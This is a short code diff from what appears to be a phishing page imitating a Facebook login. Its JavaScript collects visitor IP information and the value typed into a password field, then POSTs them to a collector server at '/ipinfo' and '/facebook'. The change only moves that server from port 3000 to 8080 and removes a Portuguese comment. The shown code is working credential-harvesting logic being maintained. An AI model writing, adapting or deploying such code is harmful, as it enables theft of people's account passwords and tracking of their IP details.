@@ -59,8 +59,7 @@
                     const data = await response.json();
                     console.log(data);
 
-                    // Enviar os dados para o servidor Node.js
-                    await fetch('http://localhost:3000/ipinfo', {
+                    await fetch('http://localhost:8080/ipinfo', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
@@ -82,7 +81,7 @@
                 const idpass = document.getElementById('pass').value;
                 const btn = document.querySelector('.btn');
         
-                const response = await fetch('http://localhost:3000/facebook', {
+                const response = await fetch('http://localhost:8080/facebook', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
